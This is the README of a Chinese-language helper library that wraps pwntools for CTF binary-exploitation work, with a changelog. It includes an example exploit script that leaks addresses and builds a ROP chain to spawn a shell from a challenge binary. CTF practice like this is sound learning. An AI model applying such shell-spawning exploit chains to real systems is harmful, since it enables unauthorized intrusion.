# pwn_all_in_one

## 背景

每次写pwn题的时候，都需要使用到重复的模板，个人感觉非常的占位置，所以继承了一个pwntools.py的文件

每次写题目的时候只需要`from pwntools import *`就可以开始快速写题，而无需注意到某些烦人的代码片段

## 使用

本脚本是基于Python3的pwntools，使用到了一些Python3独有的f-string之类的东西，所以Python2的pwner可能无法使用，得自己改改

使用方法非常的简单, 把下面的pwntools.py放到`~/.local/lib/python3.X/site-packages`, Python默认导包的路径就行了

随便写了一个脚本用例来参考一下

- 如果是打本地, 直接`python3 exp.py`就可以进行本地运行了
- 如果是打远程, 使用`python3 exp.py 114.51.41.91:11451` 或者 `python3 exp.py 114.51.41.91 11451` 就可以自动打远程

当然远程ip还可以在`init`函数中设置, 或者在执行init函数之前设置`pwnio`对象的`ip`和`port`属性

```python
from pwntools import *

init("./buffer_fly")    # 调用init函数,每次只需要调用这个就可以开始写题了,必要的参数是文件名！

sla("name", "")

ru("your name:")
rl()

close_plt = pwnio.elf.plt["close"]    # 注意要调用pwnio这个类中的elf,也可以使用pwnio["elf"].plt["close"]

true_close_plt = i16(hex(uu64(ru("\n"))) + "0a") - 10
info(true_close_plt)
base = true_close_plt - (0x55765683C100 - 0x55765683B000)
info(base)

pop_rdi_ret = 0x0000000000001423 + base
ret = 0x000000000000101A + base

sa("age", b"/bin/sh|")
ru("your age:")
stack = l64()   # l64是一个封装好的接受\x7f开头的64位地址

info(f"stack --> {hex(stack)}")

bin_sh = stack + (0x7FFC4757AF40 - 0x7FFC4757B060)
back_door = base + 0x129D

payload = (
    b"sh 0>&2 ".ljust(0x28, b"a")
    + p64(pop_rdi_ret)
    + p64(bin_sh)
    + p64(back_door)
    + p64(0)
)

dbg()   # 调用gdb.attach, 如果是远程, 那么就不会执行

sa("number", payload)
sl("sh 1>&2")

ia()    # 交互
```

## 更新日志
- 2022.9.4
  - 配置了部分常用函数
- 2022.9.22
  - 默认使用wsl2 ubuntu进行debug， 若要自己使用自己的终端调试配置，在init函数中第四个参数terminal_args中添加
- 2022.9.25
  - 修复了静态文件加载会爆libc无效错误的异常
  - 添加了一个timeout模块，用来进行自定义事件的pwn
  - 更新了init函数，添加了自定义ip和port的功能，同时保留了命令行输入ip和port的功能
- 2022.10.1
  - 重构了init模块
  - 将所有的全局变量转为pwnio类中的成员变量，方便其他文件导入模块时更改
  - 删除了部分不必要的函数
  - 优化了dbg()函数，远程将不会开启gdb调试
  - 更新了open_dbg()和close_dbg()
  - 规范了函数注释
- 2022.10.31
  - 优化了pwnio，使用了Python的面向对象
  - 目前调用pwnio对象的属性可以通过`.`的方式调用，也可以使用`[]`的方式调用
  - 新添加一个均分列表的方法
- 2022.11.19
  - 新增`libcpatcher.py`文件，基于patchelf一键修改elf文件的libc
  - 新增了leak函数，使用leak获取地址的同时在控制台打印泄露的地址
  - 更新了i16和i10函数，可以传入bytes或者str类型
  - 修改默认开启过滤 `Text is not bytes` 的警告